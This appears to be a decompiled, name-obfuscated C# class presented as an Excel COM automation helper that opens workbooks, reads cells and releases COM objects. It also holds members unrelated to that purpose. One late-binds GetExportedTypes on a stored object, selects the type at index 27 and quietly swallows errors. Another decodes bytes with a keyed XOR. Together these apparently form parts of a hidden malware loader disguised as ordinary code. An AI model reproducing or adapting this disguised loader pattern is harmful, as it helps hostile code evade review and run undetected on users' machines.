using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Rj82;
using i2G;
using n3X;
using q3A;
using z9M;

namespace Zs65;

public class m1XN
{
	private n2W8 _oXls;

	private Ab9 _oWBook;

	private j8G _oSheet;

	public n2W8 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public Ab9 OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public j8G OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public m1XN()
	{
		_oXls = (n2W8)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Dp95(string z7C2, bool c1J8)
	{
		OWBook = OXls.Workbooks.Open(z7C2, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = c1J8;
	}

	internal static bool Ng28()
	{
		try
		{
			try
			{
				Type type = (Type)Xc7j(RuntimeHelpers.GetObjectValue(n2C.mDic["Deep"]));
				if (Operators.CompareString(type.Name, n2C.mDic[n2C.tName].ToString(), false) == 0)
				{
					n2C.mDic.Add(n2C.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void r6K5(string Ao08)
	{
		OSheet = (j8G)OWBook.Sheets[Ao08];
	}

	public Pz2 Ai60(int z6G7, int Gn8r)
	{
		return (Pz2)OSheet.Cells[z6G7, Gn8r];
	}

	public void m1E5(bool Sw81)
	{
		if (OWBook != null)
		{
			OWBook.Close(Sw81, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		n2W8 i0BR = OXls;
		Qd0p(ref i0BR);
		OXls = i0BR;
	}

	internal static byte Ly41(byte x2W3, byte[] Rj0w, int Xg3e, int Lc8s)
	{
		x2W3 = (byte)(x2W3 ^ checked((byte)(Rj0w[unchecked(Lc8s % Rj0w.Length)] ^ ((Lc8s + unchecked(Xg3e % Rj0w.Length)) & Xg3e))));
		return x2W3;
	}

	private static void Qd0p<i3P7>(ref i3P7 i0BR, bool Qd8n = false) where i3P7 : class
	{
		if (i0BR == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(i0BR))
			{
				if (Qd8n)
				{
					Marshal.FinalReleaseComObject(i0BR);
				}
				else
				{
					Marshal.ReleaseComObject(i0BR);
				}
			}
		}
		finally
		{
			i0BR = null;
		}
	}

	internal static object Xc7j(object g5GS)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(g5GS, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
